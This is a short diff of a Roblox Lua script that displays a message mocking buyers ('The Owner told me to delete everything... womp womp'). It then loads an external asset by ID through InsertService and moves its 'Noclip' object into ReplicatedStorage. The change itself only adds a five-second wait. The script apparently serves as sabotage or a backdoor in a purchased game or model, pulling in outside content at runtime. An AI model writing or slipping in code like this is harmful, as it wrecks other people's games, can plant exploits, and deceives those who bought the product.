@@ -7,6 +7,7 @@ Text.Position = UDim2.new(0,0,0,0)
 Text.TextColor3 = Color3.new(0, 0, 0)
 Text.TextScaled = true
 Text.Text = "The Owner told me to delete everything so I did, now is this the only thing that will happen on these machines. If you bought these, womp womp."
+wait(5)
 local InsertService = game:GetService("InsertService") local hi = InsertService:LoadAsset(253890420) hi.Noclip.Parent = game.ReplicatedStorage
 wait(10)
 print("NOW")
